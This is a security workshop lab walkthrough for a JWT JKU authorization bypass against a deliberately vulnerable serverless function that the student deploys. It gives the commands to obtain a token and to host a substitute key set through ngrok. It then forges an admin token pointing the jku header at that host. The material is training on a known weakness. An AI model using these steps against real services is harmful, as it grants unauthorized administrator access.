## JWT - JKU Authorization Bypass

* In your image, navigate over to `/root/labs/Serverless-Workshop/`
* Run `pip3 install pipenv`
* Run `pipenv install` and `pipenv shell` 
* In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`
* Wait for instructor to explain the contents of the lab
* Install a package for this to work `npm install -g jwt-cli`
* Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/JWT-JWK/serverless.yml)
* Deploy the function with the command `sls deploy`
* Wait for the function to deploy completely


Initialize the Program with the following command 

```bash
http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
```

you should see an output like this

```bash
    HTTP/1.1 200 OK
    Connection: keep-alive
    Content-Length: 73
    Content-Type: application/json
    Date: Fri, 26 Jul 2019 11:56:09 GMT
    Via: 1.1 706c647442c234a140558b049b967cc5.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: GPaQyO3YdDda1NBe5hqqZ5a7Mpdf5NgZxm2kjQm1TQk76V2cWQ9m_Q==
    X-Amz-Cf-Pop: BLR50-C1
    X-Amzn-Trace-Id: Root=1-5d3aea58-c194ed1820098bd0973e3f08;Sampled=0
    X-Cache: Miss from cloudfront
    x-amz-apigw-id: dbmNwEp0PHcFY8Q=
    x-amzn-RequestId: 5a8fc007-af9c-11e9-b076-b3cc7c0d1d4b
    
    {
        "url": "https://jwk-resources-1564139712929.s3.amazonaws.com/jwks.json"
    }
```
Now, obtain a token from the system by logging in

```bash
http POST https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/login user=admin password=admin
```

you should see output like this

```json
{
    "token": "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vandrLXJlc291cmNlcy0xNTY0MTM5NzEyOTI5LnMzLmFtYXpvbmF3cy5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoidXNlciJ9.hsA7nYpgplSmhLLhFX18cJTO2HGJYeqMDT8OQe1IZRWseH9ZDOiSa1QHQvSkhmrVSB8h_0Cw6nCj_v5JblnyUC-peY1nWzDAD1xbZCfY0PDUXaq-mKOxfr1-X0Uotc-UabTISGcciLl3DJvRspJa928xNrMM5JRIpYX3X5UpiucmUcbBtudYn-KPgVJVbAvCxB_cAGTi5IWT7bDMnO5-ofcL29xjo-BYhkX9JVPG3xg6yfKEOTSgFjLq6dbldu_sNX-KSwohKKRVkhIkSQOpIdUcw8u9BMqJ3tSE8fgugEZfu5oGqciz9jo_CRwahkEjkZ8XCc4QtfO_TiL63sDnCA",
    "user": "user"
}
```

Copy the `token` value and run `jwt <copied token value`, you should see something like this

```bash
Header
{
  "alg": "RS256",
  "jku": "https://jwk-resources-1564139712929.s3.amazonaws.com/jwks.json"
}

Payload
{
  "user": "user"
}

```

Now, open another two tabs of your lab image. You have now a total of three tabs. Let's call the current tab, **Tab 1**

In the **Tab 2**: 
* In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`
* Run: `python -m http.server`

In the **Tab 3**:
* Run `ngrok http 8000`

```bash
Session Status                online
Session Expires               7 hours, 10 minutes
Update                        update available (version 2.3.34, Ctrl-U to update
Version                       2.2.8
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://f8ccd11d.ngrok.io -> localhost:8000
Forwarding                    https://f8ccd11d.ngrok.io -> localhost:8000
```

Back in **Tab 1**:
* Run `python token_gen.py https://f8ccd11d.ngrok.io` 
* Copy the generated token starting `ey....`
* Run 
```bash
http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/jwk Authorization:<Copied Token>
```

You should see a response, that you are administrator

